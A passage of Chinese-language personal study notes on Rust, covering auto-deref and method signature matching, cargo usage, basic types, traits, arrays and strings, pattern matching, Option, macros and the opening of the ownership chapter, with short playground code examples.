<h2 id="签名匹配的语法糖"><a class="header" href="#签名匹配的语法糖">签名匹配的语法糖</a></h2>
<p>(&amp;&amp;x)得到的类型是&amp;&amp;String，这个并不和deref的签名匹配，所以得到<code>&amp;String</code>。默认的<code>*</code>行为就是这样。</p>
<p>为什么不可以。Rust虽然有自动解引用的功能。会一直帮你解引用直到找到匹配的方法，比如下面三个都是合法的</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let z = x.len();			// 这个是语法糖，如果用.运算符的话，可以自动取引用
let z = (&amp;x).len();			// len的签名就是&amp;self
let z = (&amp;&amp;&amp;&amp;&amp;&amp;x).len();	// 自动解引用
<span class="boring">}
</span></code></pre></pre>
<p>无法匹配的原因是：</p>
<blockquote>
<p>如果智能指针中的方法与它内部成员的方法冲突了怎么办呢？编译器会优先调用当前最匹配的类型，而不会执行自动deref。</p>
</blockquote>
<p>因为其实每个引用都是有解引用这个方法的，所以<code>&amp;&amp;String</code>优先和自己<code>&amp;String</code>的解引用方法匹配上了，就得到了<code>&amp;String</code>。另外一个是，这个自动匹配是<code>.</code>运算符的语法糖，作为普通的函数参数就老老实实匹配吧。</p>
<div class="table-wrapper"><table><thead><tr><th>函数签名要求传递的类型</th><th>&amp;self</th><th>&amp;mut self</th><th>self</th></tr></thead><tbody>
<tr><td>self.func()</td><td>ok</td><td>如果self是mut变量就ok</td><td>ok</td></tr>
<tr><td>(&amp;mut self).func</td><td>ok</td><td>ok</td><td>error0</td></tr>
<tr><td>(&amp;self).func</td><td>ok</td><td>error1</td><td>error2</td></tr>
</tbody></table>
</div>
<p>error 0: cannot move out of <code>*self</code> which is behind a mutable reference move occurs because <code>*self</code> has type <code>String</code>, which does not implement the <code>Copy</code> trait. 也就是说，如果是基本变量实现了Copy Trait的话，就可以了。</p>
<p>error 1: consider changing this to be a mutable reference. label: <code>self</code> is a <code>&amp;</code> reference, so the data it refers to cannot be borrowed as mutable.</p>
<p>error 2: cannot move out of <code>*self</code> which is behind a shared reference move occurs because <code>*self</code> has type <code>String</code>, which does not implement the <code>Copy</code>. 也就是说，如果是基本变量实现了Copy Trait的话，就可以了。</p>
<p>然后的话，无论是<code>&amp;&amp;self</code>, <code>&amp;&amp;&amp;self</code>, <code>&amp;&amp;&amp;&amp;self</code>和<code>&amp;self</code>都是一样的效果。要想和<code>&amp;mut</code>达到一样的效果，需要<code>&amp;mut&amp;mut self</code>,<code>&amp;mut &amp;mut&amp;mut self</code>，但是应该不会这么写代码？换言之，一个是自动<code>deref</code>，一个是自动<code>derefmut</code>，中间有一个<code>deref</code>，就不能在自动<code>derefmut</code>了，参数不合法，error 1。</p>
<p>对于&amp;mut型指针，请大家注意不要混淆它与变量绑定之间的语法。如果mut修饰的是变量名，那么它代表这个变量可以被重新绑定；如果mut修饰的是“借用指针&amp;”，那么它代表的是被指向的对象可以被修改。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let mut var = 0_i32;
    {
        let p1 = &amp;mut var; // p1 指针本身不能被重新绑定,我们可以通过p1改变变量var的值
        *p1 = 1;
    }
    {
        let temp = 2_i32;
        let mut p2 = &amp;var; // 我们不能通过p2改变变量var的值,但p2指针本身指向的位置可以被改变
        p2 = &amp;temp;
    }
    {
        let mut temp = 3_i32;
        let mut p3 = &amp;mut var; // 我们既可以通过p3改变变量var的值,而且p3指针本身指向的位置也可以改变
        *p3 = 3;
        p3 = &amp;mut temp;
    }
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="基础知识-3"><a class="header" href="#基础知识-3">基础知识</a></h1>
<p>下面的内容写于我对Rust还一无所知的情况。</p>
<!-- toc -->
<p>Rust是一门优秀的语言。太强了。唯一的缺点，可能是比较难学。</p>
<blockquote>
<p>Rust 一门赋予每个人构建可靠且高效软件能力的语言。
高性能：Rust 速度惊人且内存利用率极高。由于没有运行时和垃圾回收，它能够胜任对性能要求特别高的服务，可以在嵌入式设备上运行，还能轻松和其他语言集成。
可靠性：Rust 丰富的类型系统和所有权模型保证了内存安全和线程安全，让您在编译期就能够消除各种各样的错误。
生产力：Rust 拥有出色的文档、友好的编译器和清晰的错误提示信息， 还集成了一流的工具——包管理器和构建工具， 智能地自动补全和类型检验的多编辑器支持， 以及自动格式化代码等等。</p>
</blockquote>
<h2 id="环境-1"><a class="header" href="#环境-1">环境</a></h2>
<ul>
<li>加快下载速度，cargo改用清华源：https://mirrors.tuna.tsinghua.edu.cn/help/crates.io-index.git/。我发现他的版本还是有一定滞后的。</li>
<li>解决Blocking waiting for file lock on package cache：<code>rm ~/.cargo/.package-cache</code>。不过也可以等等（（</li>
</ul>
<p>cargo是rust官方提供的包管理器。非常强大。</p>
<p>查看文档：<code>cargo doc --open</code>，然后回打开本地浏览器查看文件包含所有依赖的文档。
编译：<code>cargo build</code>
检查语法：<code>cargo check</code>
运行：<code>cargo run</code></p>
<h2 id="管理大型工程-第七章"><a class="header" href="#管理大型工程-第七章">管理大型工程-第七章</a></h2>
<ul>
<li>Package：一个或多个crate组成，提供一系列功能。包含一个cargo.toml介绍如果去构建crate</li>
<li>Crate：a binary or library</li>
<li>Modules： 让我们可以将一个 crate 中的代码进行分组，以提高可读性与重用性。模块还可以控制项的<strong>私有性</strong>，即项是可以被外部代码使用的（public），还是作为一个内部实现的内容，不能被外部代码使用（private）。</li>
</ul>
<p>Rust 中默认所有项（函数、方法、结构体、枚举、模块和常量）都是私有的。父模块中的项不能使用子模块中的私有项，但是子模块中的项可以使用他们父模块中的项。这是因为子模块封装并隐藏了他们的实现详情，但是子模块可以看到他们定义的上下文。
结构体遵循常规，内容默认全部是私有的，除非使用 pub 关键字。枚举成员默认就是公有的。</p>
<p>引用模块的函数：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Absolute path
crate::front_of_house::hosting::add_to_waitlist();
// Relative path
front_of_house::hosting::add_to_waitlist();
或者
use crate::front_of_house::hosting
hosting::add_to_waitlist();
<span class="boring">}
</span></code></pre></pre>
<h2 id="一对应c语言的基本语法"><a class="header" href="#一对应c语言的基本语法">一、对应C语言的基本语法</a></h2>
<h3 id="变量和类型一"><a class="header" href="#变量和类型一">变量和类型(一)</a></h3>
<ul>
<li>
<p>变量：<code>let</code>不可变，<code>let mut</code>可变，<code>const</code>常量。</p>
<ul>
<li>变量遮蔽。同一个<strong>变量名</strong>前后可以是不同类型的、可变性不同的。</li>
<li><code>_</code>在Rust里是一个特殊的变量名。</li>
<li><code>static</code>全局变量。只能是不可变的。可变的全局变量是unsafe。</li>
<li><code>const</code>表示常量。往往会被编译器直接优化。</li>
</ul>
</li>
<li>
<p>类型，在Rust中可以交给上下文推导。也可以显式的在后面写出来。</p>
<ul>
<li>
<p><code>type</code>相当于C语言中的<code>typedef</code>.比如<code>type Age = u32;</code></p>
</li>
<li>
<p><code>bool</code>，有true和false两个值。一般用在逻辑表达式中。</p>
</li>
<li>
<p><code>char</code>在Rust中可以表示任何一个符合<strong>unicode标准</strong>的<strong>字符</strong>。所以一个字符占据的空间是4 bytes。所以对于一般的ASCII字符，Rust提供了单字节字符字面量</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let c1 = '\n';		//unicode
let x :u8 = b'A';	//单字节字符字面量
let s:&amp;[u8; 5] = b&quot;Hello&quot;;
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p><strong>数字</strong>有无符号数<code>u8 u16 u32 u64 u128</code>，有符号数<code>i8 i16 i32 i64 i128</code>。还有指针大小<code>isize usize</code>。数字字面量默认是i32类型，也可以加类型约束：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let var1 = 123usize;		//约束字面量的类型
let var2 = 0x8020_0000;		//可以加下划线分隔数字增加可读性
let var3 = 32;				//默认是i32类型
let var3 = 0o123 + 0b1001;	//八进制和二进制
<span class="boring">}
</span></code></pre></pre>
<p>整数溢出在debug的时候会Panic。可以编译时通过<code>rustc -C overflow-checks=no</code>关掉。</p>
</li>
<li>
<p><strong>浮点数</strong>有<code>f32 f64</code>。Rust中的类型检查是很严格的，不同浮点数不同整数要转换成同一类型才能做运算和赋值。通过<code>as</code>实现类型转换。<code>var1 as f64</code>。</p>
</li>
<li>
<p><strong>复合数据类型</strong></p>
<ul>
<li>
<p>tuple</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let a = (1, flase);	//赋值
let (m,n) = a;		//模式匹配
let x = a.0;		//通过数字索引
ley y = a.1;	
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>struct</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Point{
	x: i32,
	y: i32
}							//声明类型
let o=Point{x:0, y:0};		//赋值
let x = o.x;				//通过名字索引
let Point{m,n} = o;			//模式匹配
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>tuple struct。其实上面三种类型大同小异，就是表达方式不同，内存分布策略都是一样的。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Point(i32, i32);
let o=Point(0,0);			//赋值
let o=Point{0: 1,1: 2};		//赋值
let x = o.0;				//通过名字索引
let Point(m,n) = o;			//模式匹配
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>enum。Rust中的enum比C/C++要强大的多。代表的是多个类型“或”的关系。rust中的enum实际上是一个ADT，enum内部的variant只是一个名字而已，我们还可以将这个名字作为类型构造器来使用，意思是说我们可以把enum内部的variant当做函数来使用。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>match 枚举类实例 {
    分类1 =&gt; 返回值表达式,
    分类2 =&gt; 返回值表达式,
    ...
}
<span class="boring">}
</span></code></pre></pre>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum IpAddrKind {
    V4(u8,u8,u8,u8),
    V6(String),
}
let four = IpAddrKind::V4(127, 0, 0, 1);
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="语句和表达式"><a class="header" href="#语句和表达式">语句和表达式</a></h3>
<p>语句和表达式。在RUST中，<strong>语句</strong>和<strong>表达式</strong>的区分方式就是有没有带分号<code>;</code>。如果带了分号说明是一条语句，如果不带分号就是表达式。表达式总是会产生一个值，如果不产生值那么就是<code>()</code>。如果把表达式放在一个语句块里<code>{}</code>起来，那也可以当成表达式。</p>
<ul>
<li>
<p>循环语句：</p>
<ul>
<li><code>loop { }</code>,其实和while true的意思一样，但是编译器可以更好的理解里面的内容一定会被执行</li>
<li><code>while bool { }</code>。</li>
<li><code>for x in xxx { }</code>：主要是用来对迭代器进行遍历</li>
</ul>
</li>
<li>
<p>判断语句：<code>if bool { } else {}</code>结合表达式和语句的知识，我们知道我们也可以把他当做表达式来使用。</p>
</li>
<li>
<p>函数：<code>fn sum(x: i32, y:i32) -&gt; i32{ }</code></p>
<ul>
<li>函数可以用return来返回，也可以视<code>{}</code>为一个表达式，表达式的值就是函数的返回值。</li>
<li>支持递归，但暂时没有尾递归优化。</li>
</ul>
</li>
<li>
<p>注释：</p>
<ul>
<li>普通注释，其内容将被编译器忽略掉：
<ul>
<li><code>//</code> 单行注释，注释内容直到行尾。</li>
<li><code>/* */</code> 块注释， 注释内容一直到结束分隔符。 </li>
</ul>
</li>
<li>文档注释，其内容将被解析成 HTML 帮助文档：
<ul>
<li><code>///</code> 为接下来的项生成帮助文档。</li>
<li><code>//!</code> 为注释所属于的项（如 crate、模块或函数）生成帮助文档。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="二trait-star"><a class="header" href="#二trait-star">二、Trait :star:</a></h2>
<p>Trait和别的语言里的implement很像，但是不太一样。更准确的说，Trait是Rust的核心内容，实现了很多语法点。比implement<code>更加丰富</code>。</p>
<h3 id="trait的组成"><a class="header" href="#trait的组成">Trait的组成</a></h3>
<p>下面是一个demo，一个trait可以有一个或多个<strong>方法（或者叫函数）<strong>组成。事实上，trait里面还可以有</strong>常量和类型</strong>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Summary {
    //这三个称为method，是有self参数的，通过“变量+.”的方式调用
    fn summarizeA(self) -&gt; String;	//等价于fn summarizeA(self: Self) -&gt; String;
    fn summarize(&amp;self) -&gt; String;	//等价于fn summarizeB(self: &amp;Self) -&gt; String;
    fn summarizeB(&amp;mut self) -&gt; String;	//等价于fn summarizeC(self: &amp;mut Self) -&gt; String;
    //这个称为static function，没有self，通过“类型+::”的方式调用
    fn summarizeC() -&gt; String;
}
<span class="boring">}
</span></code></pre></pre>
<p>然后你就可以在你自己的类上<strong>实现impl</strong>这个trait。一旦实现了 trait，我们就可以用与 NewsArticle 和 Tweet 实例的非 trait 方法一样的方式调用 trait 方法了。如下所示：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Summary for MyClass {
    fn summarize(&amp;self) -&gt; String {
        format!(&quot;{}, by {} ({})&quot;, self.headline, self.author, self.location)
    }
    ...
}
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>如果我们用<code>impl</code>给一个类定义方法，其实可以看做是给类<code>impl</code>了一个<strong>匿名的trait</strong>。</li>
<li>trait是<strong>可以有默认实现</strong>的，不过也可以重写它。</li>
</ul>
<h4 id="方法和静态函数"><a class="header" href="#方法和静态函数">方法和静态函数</a></h4>
<p>事实上，method和static function没有本质的区别。
在用<code>.</code>方式调用的时候，编译器帮我们把self参数填上去了。<code>.</code>只是一个语法糖。
所以，其实self参数还可以是更复杂的，比如说<code>self:Box&lt;self&gt;</code>，如果编译器支持的话都会帮我们填好。下面介绍是怎么填写的。</p>
<p>举个例子，关注最后两行，他们是等价的。编译器帮我们做好的完整的函数调用应该是：<code>&lt;Class as Trait&gt;::function(arguments)</code>。思考一下，这样是不是能很清楚的指明我调用的是哪一个函数。</p>
<pre><pre class="playground"><code class="language-rust">pub trait Summary {
    fn summarize_a(&amp;self) -&gt; ();
}

struct People{
    name: String,
    age: u32
}

impl Summary for People{
    fn summarize_a(&amp;self)
    {
        println!(&quot;self {} is {} years old&quot;,self.name,self.age);
    }
}

fn main()
{
    let a = People {name: &quot;AAA&quot;.to_string(),age: 18};
    a.summarize_a();
    &lt;People as Summary&gt;::summarize_a(&amp;a);
}
</code></pre></pre>
<h3 id="trait作为泛型"><a class="header" href="#trait作为泛型">Trait作为泛型</a></h3>
<p>利用trait，我们可以接受各种各样的参数。比如下面这个例子。本来我们在<code>item:</code> 后面需要书写我们传递参数的具体类型，但是我们现在用<code>impl Summary</code>，那么我们传入的参数可以是<strong>任何实现了trait Summary的任何类型</strong>。这不就是泛型吗。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn notify(item: impl Summary) {
    println!(&quot;Breaking news! {}&quot;, item.summarize());
}
//需要同时实现两种Trait
pub fn notify(item: impl Summary + Display) {}
//语法糖，指定泛型T和U为满足where从句限定trait的类型。
fn some_function&lt;T, U&gt;(t: T, u: U) -&gt; i32
    where  T: Display + Clone, U: Clone + Debug
{}
<span class="boring">}
</span></code></pre></pre>
<p>少见一点的，你可以把返回值也用trait限定。<code>fn returns_summarizable() -&gt; impl Summary {}</code>，这样的话你需要返回一个实现了trait的类。</p>
<p>一个很典型的例子就是格式化输出。在 <code>println(&quot;{}\n&quot;,myinstance);</code> 的时候，其实<code>{}</code>就被替换成了执行trait之后的内容。准确来说，是这样子：</p>
<h3 id="derive-自动实现trait"><a class="header" href="#derive-自动实现trait">Derive 自动实现trait</a></h3>
<p>编译器可以帮我们自动生成**某些trait(包括Debug,Clone,Copy,Hash,ParitalEq,Eq,Default,Send,Sync等等)**的代码，比如下面这个例子，我们用derive提示编译器帮我们为People自动impl<code>Debug</code>这个trait。</p>
<pre><pre class="playground"><code class="language-rust">#[derive(Debug)]
struct People{
    name: String,
    age: u32
}

fn main()
{
    let a = People {name: &quot;AAA&quot;.to_string(),age: 18};
    println!(&quot;Debug:{:?}&quot;,a);
}
</code></pre></pre>
<h3 id="标准库定义的常见trait"><a class="header" href="#标准库定义的常见trait">标准库定义的常见trait</a></h3>
<p><strong>Display</strong>：<a href="https://doc.rust-lang.org/src/core/fmt/mod.rs.html#642-666">标准库</a>中有一个trait叫做<code>std::fmt::Display</code>，里面定义了一个方法签名<code>fn fmt(&amp;self, f: &amp;mut Formatter&lt;'_&gt;) -&gt; Result;</code>。如果你为你自己的类实现了这个方法，那么你就可以用格式化字符串了，或者简单的说就可以用<code>println(&quot;{}&quot;)</code>了。</p>
<p><strong>sized</strong>：被sized约束的类型，意思是<strong>在编译的时候有确定的大小</strong>。这个是由编译器自行推导的，我们不能为我们的类型指定他。</p>
<p><strong>Default</strong>：无参数无错误处理的构造函数。</p>
<pre><code>trait Default{
	fn default() -&gt; Self;
}
</code></pre>
<h2 id="三数组和字符串二"><a class="header" href="#三数组和字符串二">三、数组和字符串(二)</a></h2>
<h3 id="数组-1"><a class="header" href="#数组-1">数组</a></h3>
<p>数组是一个容器，在一块<strong>连续的内存空间</strong>中存储一系列<strong>相同类型</strong>的数据。数组元素的占用空间必须在编译时能确定，数组本身容纳的元素个数也要求在编译期不变。</p>
<pre><code>let v :[i32; 5] = [1,2,3,4,5];		//创建数组
let v2: [[i32:5]; 2] = [[1,2,3,4,5], [6,7,8,9,10]];		//多维数组
let x = v[0]+v[1];					//引用数组的值
</code></pre>
<h4 id="切片"><a class="header" href="#切片">切片</a></h4>
<p>可以认为<strong>数组切片</strong>是专门用于指向数组的指针。数组切片类型是<code>&amp;[T]</code>（变长数组类型是<code>[T]</code>）。数组切片是一个<strong>带有额外信息的指针(广义上的智能指针？)</strong>，他丢弃了编译时定长数组的长度信息，而将数组长度信息存储为运行期的值，因此会比裸指针占用更多的存储空间。</p>
<p>其实这样存储着运行时大小信息的指针还有一个名字是<strong>fat pointer</strong>，与之相对应的概念是<strong>DST(dynamic sized type)</strong>，意思是在编译的时候无法确定大小的类型。安全起见我们用fat pointer指向DST。</p>
<p>在Rust中，我们只能通过指针间接的操作DST。局部变量和函数参数的类型不能使DST类型；enum中不能包含DST类型，struct中最后一个参数可以是DST，并且这样的话struct也是DST。</p>
<h4 id="range-1"><a class="header" href="#range-1">Range</a></h4>
<p>我觉得他不是数组。他是一个迭代器。或者说他impl了<code>Iterator</code>这个trait。range有一个语法糖是<code>start .. end</code>。我们可以用range来实现C语言中<code>for (i=start;i&lt;end;i++)</code>这样的句子。</p>
<pre><pre class="playground"><code class="language-rust">use std::ops::Range;

fn main() {
    let r = 1..5;
    let rr = Range{start:1,end:5};
    for i in r{
        println!(&quot;{}&quot;, i);
    }
    for i in rr{
        println!(&quot;{}&quot;, i);
    }
}
</code></pre></pre>
<p>事实上，range比这个更强大，还可以规定step，还可以到无穷（因为是迭代器）。<code>std::ops::RangeTo</code>，<code>std::ops::RangeFrom</code>。这样可以使用Range，但是要理解Range需要知道Iterator的原理。</p>
<h4 id="数组的边界检查"><a class="header" href="#数组的边界检查">数组的边界检查</a></h4>
<p>可以试试下面这个CLI demo，第一个参数是数组的index。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let v = [10i32,20,30,40,50];
    let index: usize = std::env::args().nth(1).map(|x|x.parse().unwrap_or(0)).unwrap_or(0);
    println!(&quot;{:?}&quot;,v[index]);
}
</code></pre></pre>
<p>在Rust中，索引操作也是可以自行扩展的运算符。如果希望一个类可以执行<strong>索引读</strong>操作，需要该类型实现<code>std::ops::Index</code>；如果希望一个类可以执行<strong>索引写</strong>操作，需要该类型实现<code>std::ops::IndexMut</code>。在Rust中的数组默认的索引操作是会进行边界检查的，所以性能可能会稍弱于C/C++。</p>
<p>更Rust的遍历数组的办法不应该用range，应该用迭代器：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let v = [10i32,20,30,40,50];
    for (index,value) in v.iter().enumerate() {
    	println!(&quot;{} {}&quot;,index,value);
    }
    
    //filter方法可以执行过滤，nth可以获取第n个元素
    let item = v.iter().filter(|&amp;x| *x % 2 ==0).nth(2);
}
</code></pre></pre>
<h3 id="字符串-2"><a class="header" href="#字符串-2">字符串</a></h3>
<p>Rust中的字符串涉及两种类型，一个是&amp;str，一个是String。</p>
<h4 id="str-2"><a class="header" href="#str-2">&amp;str</a></h4>
<p>Rust中的字符串内部默认是使用utf-8编码格式的。因为utf-8是中的每一个字符的大小是1～4 byte，所以直接使用index操作会和你想得不一样。当然，如果都是英文还行。&amp;str只是一个reference，没有对生命周期进行管理的能力。</p>
<pre><pre class="playground"><code class="language-rust">fn main(){
    let greeting :&amp;str = &quot;你好，世界&quot;;
    let substr :&amp;str = &amp;greeting[3..];	//你可以把它换成别的数字
    println!(&quot;{}&quot;,substr);
}
</code></pre></pre>
<h4 id="string"><a class="header" href="#string">String</a></h4>
<p>String在Heap上申请了一块内存空间，它有权对这块内存空间进行管理和扩容。String实现了<code>Deref&lt;Target=str&gt;</code>的Trait，所以在很多情况下，&amp;String类型可以被编译器自动的转换为&amp;str类型。</p>
<h2 id="四pattern-destructure"><a class="header" href="#四pattern-destructure">四、Pattern Destructure</a></h2>
<pre><pre class="playground"><code class="language-rust">fn main() {
    println!(&quot;Hello, world!&quot;);
    let t = (1,2,3);
    let (x,y,z) = t;
    println!(&quot;{},{},{}&quot;,x,y,z);
}
</code></pre></pre>
<h3 id="match-1"><a class="header" href="#match-1">Match</a></h3>
<p>match特别适合一个类型的取值有多种可能性的情况，有点像case，不过强大的多。</p>
<p>Match要求所有的可能取值都要被匹配到（穷尽，exhaustive），否则会出现编译错误；其实也挺自然的，因为match语句要返回一个值，有的情况返回有的情况不返回那不是才奇怪吗。<code>_</code>代表的是Default的含义。</p>
<pre><pre class="playground"><code class="language-rust">enum Direct{
    East,West,North,South
}

fn main() {
    let x = Direct::East;
    let y = Direct::South;
    match y {
        Direct::East =&gt; {println!(&quot;East&quot;);}
        _ =&gt; {println!(&quot;Other&quot;);}
    }
}
</code></pre></pre>
<p>我们可以在match中绑定变量。我们使用<code>@</code>符号绑定变量，前面是新声明的变量，后面是需要匹配的模式。如果我们要绑定被匹配对象的reference（避免ownership的转移），我们可以使用<code>ref</code>关键字。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let x = 'x';
    match x{
        e @ 'a'..='z'=&gt; println!(&quot;Lower case {}&quot;,e),	
        	//e @ 'a'..='z' if false=&gt; println!(&quot;Lower case {}&quot;,e), 看看会发生什么
        'A'..='Z' =&gt; println!(&quot;Upper case&quot;),
        _ =&gt; println!(&quot;Else&quot;)
    }
}
</code></pre></pre>
<p>可以用<code>|</code>连接匹配条件，表示一个或关系；还可以在匹配条件之后加if，有点像与关系。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
	let x = 'z';
    match x{
        e @ 'a'..='z' | e @ 'A'..='Z'=&gt; println!(&quot;Letter {}&quot;,e),
        '0'..='9' =&gt; println!(&quot;Number&quot;),
        _ =&gt; println!(&quot;Else&quot;)
    }
}
</code></pre></pre>
<h3 id="if-let-1"><a class="header" href="#if-let-1">if-let</a></h3>
<p>是一个语法糖，相当于不要求全部匹配的match。opt_val是一个Option。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let opt_val = Some(1);
    if let Some(x) = opt_val{
        println!(&quot;{}&quot;,x);
    }
}
</code></pre></pre>
<p>Option是一个常用的enum。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub enum Option&lt;T&gt; {
    None,
    Some(T),
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="函数中的使用"><a class="header" href="#函数中的使用">函数中的使用</a></h3>
<p>可以在函数参数中做一个模式解构。</p>
<h2 id="五变量和类型三"><a class="header" href="#五变量和类型三">五、变量和类型(三)</a></h2>
<p>Rust中的变量是ADT。</p>
<ul>
<li>最简单的类型<code>unit ()</code>的基数是1，他的取值范围是<code>()</code></li>
<li><code>bool</code>的基数是2，他的取值范围是<code>true</code>/<code>false</code>。</li>
<li>i32的基数是$2^{32}$。</li>
</ul>
<p>我们把这些类型组合成一个复合类型。</p>
<ul>
<li><code>type T1 = [i32; 2];</code></li>
<li><code>type T2 = (i32, i32);</code></li>
<li><code>struct T3(i32,i32); </code></li>
<li><code>struct T4 {f1:i32, f2:i32,}</code></li>
</ul>
<p>这四个类型虽然互不相同，但是他们的内存布局是相同的。他们的基数都是$2^{32}×2^{32}$。</p>
<ul>
<li><code>enum Dir {North,West,South,East}</code>，他的基数是4。</li>
<li><code>enum Option&lt;i32&gt; {Some(i32), None}</code>的基数是$2^{32}+1$</li>
</ul>
<h3 id="never-typeunit-type"><a class="header" href="#never-typeunit-type">Never Type&amp;Unit type</a></h3>
<p><a href="https://doc.rust-lang.org/std/primitive.unit.html">unit type</a>，也就是<code>()</code>。<a href="https://doc.rust-lang.org/std/primitive.never.html">never type</a>，也就是<code>!</code>。</p>
<p>unit type是函数默认的返回参数，也就是说如果函数不加<code>-&gt; xxx</code>就是默认加上了<code>-&gt; ()</code>。<code>()</code>的大小是0，<code>!</code>的大小也是0。</p>
<pre><pre class="playground"><code class="language-rust">#![feature(never_type)]
use std::mem::size_of;

fn main() {
    println!(&quot;{} {}&quot;,size_of::&lt;!&gt;(),size_of::&lt;()&gt;());
}
</code></pre></pre>
<p><code>fn exit(code: i32) -&gt; !</code> exits the process without ever returning, and so returns <code>!</code>。<code>break</code>, <code>continue</code> and <code>return</code> expressions also have type <code>!</code>。<code>!</code>类型可以被转换成任何类型。</p>
<h3 id="option"><a class="header" href="#option">Option</a></h3>
<p>所以多用<a href="https://doc.rust-lang.org/std/option/enum.Option.html">Option</a></p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub const fn is_some(&amp;self) -&gt; bool
Returns true if the option is a Some value.

pub const fn is_none(&amp;self) -&gt; bool
Returns true if the option is a None value.

pub fn unwrap(self) -&gt; T		//不推荐
Returns the contained Some value, consuming the self value.
Because this function may panic, its use is generally discouraged. Instead, prefer to use pattern matching and handle the None case explicitly, or call unwrap_or, unwrap_or_else, or unwrap_or_default.

pub fn expect(self, msg: &amp;str) -&gt; T
Returns the contained Some value, consuming the self value.
Panics if the value is a None with a custom panic message provided by msg.
<span class="boring">}
</span></code></pre></pre>
<p>对于裸指针，最好用Option进行包装防止使用空指针的情况。这是“零开销抽象”</p>
<h2 id="六宏"><a class="header" href="#六宏">六、宏</a></h2>
<p>Rust中的宏在语法解析之后起作用，所以增加了类型检查，比C/C++的宏更加强大。宏的调用方式是<code>some_macro!(...)</code>，或者<code>some_macro!{...}</code>、<code>some_macro![...]</code>。宏是元编程的一种方式。我们之前用的<code>println!</code>就是一个宏。</p>
<h3 id="声明宏-declarative-macros"><a class="header" href="#声明宏-declarative-macros">声明宏 declarative macros</a></h3>
<p>可以使用macro_rules。expander是宏扩展的语法定义，后面是转换机制。语法定义的标识符以<code>$</code>开头，类型支持<code>item</code>,<code>block</code> ,<code>stmt</code> ,<code>pat</code> ,<code>expr</code>,<code>ty</code>,<code>itent</code> ,<code>path</code>,<code>tt</code>。如果我们希望在宏中重复出现语法元素，可以用<code>+</code>和<code>*</code>来实现，他们类似正则表达式中的，<code>+</code>代表出现一次或多次，<code>*</code>代表出现零次或多次。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>macro_rules!  {
    (expander) =&gt; {
        transcriber
    };
}
<span class="boring">}
</span></code></pre></pre>
<p>比如：	</p>
<pre><pre class="playground"><code class="language-rust">macro_rules! hashmap{
    ($( $key:expr =&gt; $val: expr), *) =&gt; {
        {
            let mut map = std::collections::HashMap::new();
            $(map.insert($key,$val); )*
            map
        }
    }
}

fn main() {
    let x = hashmap!{1 =&gt; 2 , 3 =&gt; 4};
    println!(&quot;{:?}&quot;,x);
}
</code></pre></pre>
<h3 id="过程宏-procedural-macros"><a class="header" href="#过程宏-procedural-macros">过程宏 procedural macros</a></h3>
<p>略</p>
<hr />
<p>至此，开始Rust之旅吧。下面你可能需要用到的知识：
还需要了解所有权和引用的知识，他们是Rust保护内存安全的基础，否则过编译寸步难行。
知道泛型能提高代码的可重用性，还有更进一步的静态分派和动态分派。
错误处理帮助我们写出更健壮的代码。Panic，Result，Option。
标准库当然也要会用啦，还可以利用别人造好的crate。
Rust的宏比C的宏强大的多。
Unsafe可以支持某些操作，但是你要自己保障safe。
Rust也支持函数式编程，支持闭包，迭代器。
Rust也支持并发，协程和线程。
工程管理也是必不可少的。</p>
<h2 id="所有权和引用-star"><a class="header" href="#所有权和引用-star">所有权和引用 :star:</a></h2>
<p>参考第四章。
Rust能保障内存安全，<strong>所有权ownership</strong>这个概念非常重要。所有权的概念就是为了管理堆上的数据。</p>
<blockquote>
<p>Each value in Rust has a variable that's called its <strong>owner</strong>.
There can only be one owner at one time.
When the owner goes out of scope, the value will be dropped.</p>
</blockquote>
<p>在栈上存储的数据，在函数返回时都会被清理。
但是在堆上，我们动态申请的数据，要怎么办呢？</p>
<pre><pre class="playground"><code class="language-rust">fn main(){
    let str_a = String::from(&quot;fdaaaaa&quot;); //生命周期的开始
    println!(&quot;{}&quot;,str_a);            
} //生命周期的结束
</code></pre></pre>
